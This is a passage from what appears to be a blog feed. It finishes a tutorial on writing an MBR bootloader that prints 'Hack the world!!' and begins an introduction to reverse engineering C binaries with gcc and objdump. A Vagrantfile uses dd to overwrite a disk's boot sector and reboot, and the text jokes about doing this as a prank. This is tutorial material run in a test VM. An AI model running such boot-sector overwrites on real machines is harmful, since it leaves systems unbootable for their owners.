</span></span><span class="line"><span class="cl">    <span class="ow">or</span> <span class="n">al</span><span class="p">,</span> <span class="n">al</span>      <span class="p">;</span> <span class="n">Check</span> <span class="k">if</span> <span class="n">end</span> <span class="n">of</span> <span class="n">string</span>
</span></span><span class="line"><span class="cl">    <span class="n">jz</span> <span class="n">halt</span>        <span class="p">;</span> <span class="k">if</span> <span class="n">end</span> <span class="n">of</span> <span class="n">string</span><span class="p">,</span> <span class="n">jump</span> <span class="n">to</span> <span class="n">halt</span>
</span></span><span class="line"><span class="cl">    <span class="ne">int</span> <span class="mi">10</span><span class="n">h</span>        <span class="p">;</span> <span class="k">else</span><span class="p">,</span> <span class="nb">print</span> <span class="n">char</span> <span class="n">via</span> <span class="n">interrupt</span>
</span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="o">.</span><span class="n">loop</span>      <span class="p">;</span> <span class="n">loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">halt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">msg</span><span class="p">:</span> <span class="n">db</span> <span class="s2">&#34;Hack the world&#34;</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">times</span> <span class="mi">510</span><span class="o">-</span><span class="p">(</span><span class="o">$-$$</span><span class="p">)</span> <span class="n">db</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">dw</span> <span class="mh">0xAA55</span>
</span></span></code></pre></div><p>Unfortunately, testing the above code does not produce the desired results, but instead produces some garbage values.</p>
<p><img loading="lazy" src="https://i.imgur.com/LUbZu5D.png#center" alt=""  />
</p>
<p>Further investigation revealed that our bootloader in memory is not properly aligned. This led me down another rabbit hole, this time about how the contents of the computer&rsquo;s physical memory look when the BIOS jumps to my bootloader code. Here is a <a href="https://wiki.osdev.org/Memory_Map_(x86)">dedicated page</a> on the same topic here which covers a lot of details about it.</p>
<p>For us, we need to add a few more instructions to our code to properly align it. Finally, our code will look like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">bits</span> <span class="mi">16</span>      <span class="p">;</span> <span class="n">BIOS</span> <span class="n">works</span> <span class="ow">in</span> <span class="mi">16</span> <span class="n">bit</span> <span class="n">mode</span>
</span></span><span class="line"><span class="cl"><span class="n">org</span> <span class="mh">0x7c00</span>   <span class="p">;</span> <span class="n">MBR</span> <span class="n">is</span> <span class="n">loaded</span> <span class="n">at</span> <span class="mh">0x7c00</span> <span class="n">memory</span> <span class="n">location</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">ax</span><span class="p">,</span> <span class="mh">0x03</span>
</span></span><span class="line"><span class="cl"><span class="ne">int</span> <span class="mi">10</span><span class="n">h</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">si</span><span class="p">,</span> <span class="n">msg</span>
</span></span><span class="line"><span class="cl"><span class="n">mov</span> <span class="n">ah</span><span class="p">,</span> <span class="mi">0</span><span class="n">Eh</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">loop</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">lodsb</span>
</span></span><span class="line"><span class="cl">    <span class="ow">or</span> <span class="n">al</span><span class="p">,</span> <span class="n">al</span>
</span></span><span class="line"><span class="cl">    <span class="n">jz</span> <span class="n">halt</span>
</span></span><span class="line"><span class="cl">    <span class="ne">int</span> <span class="mi">10</span><span class="n">h</span>
</span></span><span class="line"><span class="cl">    <span class="n">jmp</span> <span class="o">.</span><span class="n">loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">halt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">cli</span>     <span class="p">;</span> <span class="n">disable</span> <span class="n">further</span> <span class="n">interrupts</span>
</span></span><span class="line"><span class="cl"><span class="n">hlt</span>     <span class="p">;</span> <span class="n">halt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">msg</span><span class="p">:</span> <span class="n">db</span> <span class="s2">&#34;Hack the world!!&#34;</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">times</span> <span class="mi">510</span><span class="o">-</span><span class="p">(</span><span class="o">$-$$</span><span class="p">)</span> <span class="n">db</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">dw</span> <span class="mh">0xAA55</span>
</span></span></code></pre></div><p>This time we get the desired result after compiling and testing the above.
<img loading="lazy" src="https://i.imgur.com/6eV40TA.png#center" alt=""  />
</p>
<p>We successfully created a bootloader that prints some message on the screen.</p>
<h2 id="conclusions">Conclusions</h2>
<p>We know that a MBR sector is comprised of 3 parts:</p>
<ul>
<li>bootloader (446 bytes)</li>
<li>partition table (64 bytes)</li>
<li>magic number (2 bytes)</li>
</ul>
<p>And each component can be extracted separately and treated as a regular binary file. This means that we can create backups of only partition tables if necessary. Alternatively, we can <strong>replace the bootloader code</strong> with another code without affecting the partition table.(<em>Obviously for fun; like a friendly joke, nothing malicious</em>) 😈 😈</p>
<p><img loading="lazy" src="https://imgs.xkcd.com/comics/fight.png#center" alt=""  />
</p>
<p>We know our above &ldquo;Hack the World!!&rdquo; code does not use all 510 bytes, so why not shrink it a little to fit in 446 bytes? This way we can protect the original partition table.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">bits</span> <span class="mi">16</span>      
</span></span><span class="line"><span class="cl"><span class="no">org</span> <span class="mi">0x7c00</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">mov</span> <span class="no">ax</span><span class="p">,</span> <span class="mi">0x03</span>
</span></span><span class="line"><span class="cl"><span class="nf">int</span> <span class="mi">10</span><span class="no">h</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">si</span><span class="p">,</span> <span class="no">msg</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">ah</span><span class="p">,</span> <span class="mi">0</span><span class="no">Eh</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">.loop:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">lodsb</span>
</span></span><span class="line"><span class="cl">    <span class="nf">or</span> <span class="no">al</span><span class="p">,</span> <span class="no">al</span>
</span></span><span class="line"><span class="cl">    <span class="nf">jz</span> <span class="no">halt</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mi">10</span><span class="no">h</span>
</span></span><span class="line"><span class="cl">    <span class="nf">jmp</span> <span class="no">.loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">halt:</span>
</span></span><span class="line"><span class="cl"><span class="nf">cli</span>     
</span></span><span class="line"><span class="cl"><span class="no">hlt</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">msg</span><span class="p">:</span> <span class="no">db</span> <span class="err">&#34;</span><span class="no">Hack</span> <span class="no">the</span> <span class="no">world</span><span class="p">!!</span><span class="err">&#34;</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">times</span> <span class="mi">446</span><span class="p">-(</span><span class="no">$-$$</span><span class="p">)</span> <span class="no">db</span> <span class="mi">0</span>         <span class="c1">; Just change 510 to 446 :)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">dw</span> <span class="mi">0xAA55</span>
</span></span></code></pre></div><p>This will generate the raw data file containing the bootloader program, which we can quickly test in a virtual machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Vagrant</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="s2">&#34;2&#34;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">config</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">  <span class="n">config</span><span class="o">.</span><span class="n">vm</span><span class="o">.</span><span class="n">box</span> <span class="o">=</span> <span class="s2">&#34;archlinux/archlinux&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="n">config</span><span class="o">.</span><span class="n">vm</span><span class="o">.</span><span class="n">box_check_update</span> <span class="o">=</span> <span class="kp">true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">config</span><span class="o">.</span><span class="n">vm</span><span class="o">.</span><span class="n">provider</span> <span class="s2">&#34;virtualbox&#34;</span> <span class="k">do</span> <span class="o">|</span><span class="n">vb</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="n">vb</span><span class="o">.</span><span class="n">gui</span> <span class="o">=</span> <span class="kp">true</span>
</span></span><span class="line"><span class="cl">    <span class="n">vb</span><span class="o">.</span><span class="n">memory</span> <span class="o">=</span> <span class="s2">&#34;512&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">config</span><span class="o">.</span><span class="n">vm</span><span class="o">.</span><span class="n">provision</span> <span class="s2">&#34;shell&#34;</span><span class="p">,</span> <span class="ss">inline</span><span class="p">:</span> <span class="s">&lt;&lt;-SHELL
</span></span></span><span class="line"><span class="cl"><span class="s"></span>    <span class="c1"># Backup the original bootloader</span>
</span></span><span class="line"><span class="cl">    <span class="n">dd</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="o">=</span><span class="sr">/dev/s</span><span class="n">da</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="n">of</span><span class="o">=</span><span class="sr">/vagrant/</span><span class="n">backedup_bootloader</span><span class="o">.</span><span class="n">bin</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="n">bs</span><span class="o">=</span><span class="mi">1</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="n">count</span><span class="o">=</span><span class="mi">446</span>
</span></span><span class="line"><span class="cl">	 
</span></span><span class="line"><span class="cl">    <span class="c1"># Copy the fun bootloader to first 446 bytes of sda</span>
</span></span><span class="line"><span class="cl">    <span class="n">dd</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="o">=</span><span class="sr">/vagrant/</span><span class="n">custom_bootloader</span><span class="o">.</span><span class="n">bin</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="n">of</span><span class="o">=</span><span class="sr">/dev/s</span><span class="n">da</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="n">bs</span><span class="o">=</span><span class="mi">1</span> <span class="p">\</span>
</span></span><span class="line"><span class="cl">      <span class="n">count</span><span class="o">=</span><span class="mi">446</span>
</span></span><span class="line"><span class="cl">	 	
</span></span><span class="line"><span class="cl">    <span class="c1"># Reboot the system to see the effect</span>
</span></span><span class="line"><span class="cl">    <span class="n">reboot</span>
</span></span><span class="line"><span class="cl">  <span class="no">SHELL</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span>
</span></span></code></pre></div><p>The <a href="https://www.vagrantup.com/intro"><code>Vagrantfile</code></a> above will launch a quick test VM. We just need to sit back and relax.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/8ynPshGnD8WnS/giphy.gif#center" alt=""  />
</p>
<p>After successful bootup and reboot, It displayed the expected message.</p>
<p><img loading="lazy" src="https://i.imgur.com/6eV40TA.png#center" alt=""  />
</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://en.wikipedia.org/wiki/BIOS">https://en.wikipedia.org/wiki/BIOS</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://www.man7.org/linux/man-pages/man1/dd.1.html">https://www.man7.org/linux/man-pages/man1/dd.1.html</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://forum.osdev.org/viewtopic.php?f=2&amp;t=18763">https://forum.osdev.org/viewtopic.php?f=2&amp;t=18763</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Intro to RE: C : part-1</title>
      <link>https://ayedaemon.github.io/post/2022/09/intro-to-re/</link>
      <pubDate>Wed, 21 Sep 2022 01:10:18 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/09/intro-to-re/</guid>
      <description>Basics of assembly and its relation with higher level constucts</description>
      <content:encoded><![CDATA[<h2 id="steps-to-generate-a-binary">Steps to generate a binary</h2>
<p>When we write a program using a language like C, it is not C source code which really gets executed. This C code passes through many steps and finally a binary file is generated out of it. This binary file is what gets executed on any computer.</p>
<p>There are many steps through which a C code is converted into a binary file:-</p>
<ol>
<li>Pre-processing</li>
<li>Compilation</li>
<li>Assemble</li>
<li>Linking</li>
</ol>
<p>Let&rsquo;s follow these steps one by one to understand what they do to the C code and how a binary is generated via this. To get started, we need a C program that we would want to convert into a binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">//file: hello_world.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// main function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello World&#34;</span><span class="p">);</span>  <span class="c1">// Print &#34;Hello World&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">5</span><span class="p">;</span>               <span class="c1">// Return with 5 return value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>If you are even a bit familiar with C programs, you would understand that the above program will create a <code>main()</code> function, call <code>printf()</code> function to print <code>Hello World</code> string and finally return with a <code>5</code> return value.</p>
<h4 id="pre-processing">Pre-processing</h4>
<p>Let&rsquo;s see what we get after <strong>pre-processing</strong> this C program. With gcc this can be done via below command</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -E hello_world.c -o hello_world.i
</span></span></code></pre></div><p>This takes the provided C program and does many things to it, few of these are mentioned below.</p>
<ul>
<li>Removes the comments.</li>
<li>Replaces the <code>#include</code> statements with the actual file content. For example, <code>#include&lt;stdio.h&gt;</code> is replaced with <code>stdio.h</code> file contents.</li>
</ul>
<h4 id="compilation">Compilation</h4>
<p>After pre-processing, the generated file is used to generate assembly instructions. These instructions are microprocessor (or CPU) specific. Microprocessor is a computer component that handles all kinds of conditional logic, arithmatic calculations and other logical activities.</p>
<p>You might have heard about few types of micro processor families like intel x86 and ARM.. but there are <a href="https://en.wikipedia.org/wiki/List_of_microprocessor">many more</a>. Unfortunately, each family has their own instruction sets to perform different tasks.</p>
<p>We can convert our <strong>pre-processed</strong> code file to equivalent <strong>assembly</strong> code using <code>gcc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -S hello_world.i -o hello_world.s
</span></span></code></pre></div><p>This will provide us with a <code>hello_world.s</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file hello_world.s
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hello_world.s: assembler source, ASCII text</span>
</span></span></code></pre></div><p>This step produces an assembly language source code for my micro-processor family (intel x86-64). If you want to generate assembly code for other families (also called, architectures), you might want to look into <a href="https://en.wikipedia.org/wiki/Cross_compiler"><strong>cross-compilers</strong></a></p>
<p>This assembly code is what get&rsquo;s executed by the processor. If we look into this file, we will be able to see the assembly code for the C program we wrote.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat hello_world.s
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">        <span class="na">.file</span>   <span class="s">&#34;hello_world.c&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="na">.text</span>
</span></span><span class="line"><span class="cl">        <span class="na">.section</span>        <span class="no">.rodata</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LC0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.string</span> <span class="s">&#34;Hello World&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="na">.text</span>
</span></span><span class="line"><span class="cl">        <span class="na">.globl</span>  <span class="no">main</span>
</span></span><span class="line"><span class="cl">        <span class="na">.type</span>   <span class="no">main</span><span class="p">,</span> <span class="na">@function</span>
</span></span><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LFB0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.cfi_startproc</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pushq</span>   <span class="nv">%rbp</span>
</span></span><span class="line"><span class="cl">        <span class="na">.cfi_def_cfa_offset</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="na">.cfi_offset</span> <span class="mi">6</span><span class="p">,</span> <span class="p">-</span><span class="mi">16</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movq</span>    <span class="nv">%rsp</span><span class="p">,</span> <span class="nv">%rbp</span>
</span></span><span class="line"><span class="cl">        <span class="na">.cfi_def_cfa_register</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">        <span class="nf">leaq</span>    <span class="no">.LC0</span><span class="p">(</span><span class="nv">%rip</span><span class="p">),</span> <span class="nv">%rax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movq</span>    <span class="nv">%rax</span><span class="p">,</span> <span class="nv">%rdi</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movl</span>    <span class="no">$0</span><span class="p">,</span> <span class="nv">%eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">call</span>    <span class="no">printf@PLT</span>
</span></span><span class="line"><span class="cl">        <span class="nf">movl</span>    <span class="no">$5</span><span class="p">,</span> <span class="nv">%eax</span>
</span></span><span class="line"><span class="cl">        <span class="nf">popq</span>    <span class="nv">%rbp</span>
</span></span><span class="line"><span class="cl">        <span class="na">.cfi_def_cfa</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span><span class="line"><span class="cl">        <span class="na">.cfi_endproc</span>
</span></span><span class="line"><span class="cl"><span class="nl">.LFE0:</span>
</span></span><span class="line"><span class="cl">        <span class="na">.size</span>   <span class="no">main</span><span class="p">,</span> <span class="no">.-main</span>
</span></span><span class="line"><span class="cl">        <span class="na">.ident</span>  <span class="s">&#34;GCC: (GNU) 12.1.1 20220730&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="na">.section</span>        <span class="no">.note.GNU-stack</span><span class="p">,</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="na">@progbits</span>
</span></span></code></pre></div><p>This is what the intermediate code in assembly language looks like. We&rsquo;ll talk more about this in later sections. For now, let&rsquo;s move forward and see how a binary file is created from this assembly code.</p>
<h2 id="assembling-into-binary">Assembling into binary</h2>
<p>We can convert the assembly code to binary file using <code>gcc</code> via the below command:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc -c hello_world.s -o hello_world.o
</span></span></code></pre></div><p>This will generate the binary object file, which can be analyzed with tools like <code>objdump</code> and <code>hexdump</code>. This file is the binary file for the source code we wrote, but we need more than that for the program to actually execute on terminal with <code>./hello_world.o</code>.</p>
<h4 id="linking-the-binary">Linking the binary</h4>
<p>This last step will take your obect file (<code>.o</code> files from last step) and produce either a library or an executable file. It replaces the references to undefined symbols with the correct addresses. There are many more things going in here other than this, so to keep it short and simple - this step will create your executable from your object file by linking it with other required files like standard libraries. Ultimately, this will generate the executable or library which we can use or distribute it.</p>
<p>Using gcc, we can achieve this with:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## -v option is just to print the verbose output.</span>
</span></span><span class="line"><span class="cl">gcc -v hello_world.o -o hello_world.out
</span></span></code></pre></div><p>After all these steps, we have our binary file and all other intermediate files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file *
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hello_world.c:   C source, ASCII text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hello_world.i:   C source, ASCII text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hello_world.o:   ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hello_world.out: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c6293fa95c56250957a3babeecd8d18fc463e7cf, for GNU/Linux 4.4.0, with debug_info, not stripped</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># hello_world.s:   assembler source, ASCII text</span>
</span></span></code></pre></div><p>To summarize everything, the C program we write goes through various steps to generate an executable binary file. And this binary file is what executes on our machine&hellip;.or in another words, this binary tells our processors about what job we want them to do.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/oYtVHSxngR3lC/giphy.gif#center" alt=""  />
</p>
<h2 id="reverse-engineering">Reverse Engineering??</h2>
<p>Reverse Engineering is the process of figuring out how something works. This process can be applied to approximately anything even computer programs.</p>
<p>If we are provided with a compiled, assembled and linked binary file, we can apply the process of reverse engineering to understand what that program does. This skill can be useful for many tasks like generating keygens, patches, understanding low-level vulnerabilities, profiling applications, malware analysis, etc..</p>
<p>Since assembly language is the closest human-readable language for any binary, we need to have a good understanding of that to perform good reverse engineering. Obviously this varies with compilers used and architecture for which the binary was compiled&hellip; So we need might need to learn about how different compilers generate assembly code for different micro-processor families.</p>
<p>Most of the times we are provided with the binary file for programs instead of the source code, therefore, we only have assembly representation to work from. However there are tools like ghidra that takes the compiled assembly code and give us a view of what the C code for that binary might look like. This is called <a href="https://en.wikipedia.org/wiki/Decompiler">decompilation</a>.</p>
<h4 id="binary----assembly-assembly----disassembly">binary &lt;&ndash;&gt; assembly (assembly &lt;&ndash;&gt; disassembly)</h4>
<p>At this point, we know about how a C program gets converted to a binary file after the complete compilation process. Let us understand more about the relation between a binary file and it&rsquo;s assembly code.</p>
<p>We have already seen that the intermediate assembly code can be converted to binary file via assemblers (in our case, gcc assembler feature). The inverse can be done via <a href="https://en.wikipedia.org/wiki/Disassembler"><strong>disassemblers</strong></a>.</p>
<p>A disassembler takes the binary file as input and read it&rsquo;s contents and maps the binary values to it&rsquo;s respective assembly instructions.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 376 25"
      >
      <g transform='translate(8,16)'>
<path d='M 112,0 L 128,0' fill='none' stroke='currentColor'></path>
<path d='M 232,0 L 248,0' fill='none' stroke='currentColor'></path>
<polygon points='136.000000,0.000000 124.000000,-5.600000 124.000000,5.600000' fill='currentColor' transform='rotate(0.000000, 128.000000, 0.000000)'></polygon>
<polygon points='256.000000,0.000000 244.000000,-5.600000 244.000000,5.600000' fill='currentColor' transform='rotate(0.000000, 248.000000, 0.000000)'></polygon>
<text text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='40' y='4' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='144' y='4' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='152' y='4' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='160' y='4' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='168' y='4' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='184' y='4' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='192' y='4' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='200' y='4' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='208' y='4' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='4' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='264' y='4' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='272' y='4' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='280' y='4' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='288' y='4' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='296' y='4' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='304' y='4' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='312' y='4' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='320' y='4' fill='currentColor' style='font-size:1em'>y</text>
<text text-anchor='middle' x='336' y='4' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='344' y='4' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='352' y='4' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='360' y='4' fill='currentColor' style='font-size:1em'>e</text>
</g>

    </svg>
  
</div>
<p>There are many disassemblers we can use like:-</p>
<ul>
<li><a href="https://www.man7.org/linux/man-pages/man1/objdump.1.html">objdump</a></li>
<li><a href="https://ghidra-sre.org/">ghidra</a></li>
<li><a href="https://rada.re/n/radare2.html">radare2</a></li>
<li><a href="https://sourceware.org/gdb/">gdb</a></li>
<li><a href="https://www.hopperapp.com/">hopper</a></li>
<li>and <a href="https://en.wikipedia.org/wiki/Disassembler#Examples_of_disassemblers">many more</a></li>
</ul>
<p>Let&rsquo;s try to disassemble our <code>hello_world.out</code> binary and see what it provides us.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">objdump --disassemble  hello_world.out <span class="p">|</span> wc -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 122</span>
</span></span></code></pre></div><p>Objdump provides a lot of output for the disassembly of a simple &ldquo;Hello Wold&rdquo; program. This is because we linked the <code>hello_world.o</code> file to obtain a <code>hello_world.out</code> file. This new file has a lot of things that helps this to run on the machine with <code>./hello_world.out</code> command.</p>
<p>If we check the unlined version of our binary, we&rsquo;ll get a lot less output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">objdump --disassemble  hello_world.o <span class="p">|</span> wc -l
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Looking at the disassembled binary</span>
</span></span><span class="line"><span class="cl">objdump --disassemble  hello_world.o
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 0000000000000000 &lt;main&gt;:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    0:   55                      push   %rbp</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    1:   48 89 e5                mov    %rsp,%rbp</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    4:   48 8d 05 00 00 00 00    lea    0x0(%rip),%rax        # b &lt;main+0xb&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    b:   48 89 c7                mov    %rax,%rdi</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    e:   b8 00 00 00 00          mov    $0x0,%eax</span>
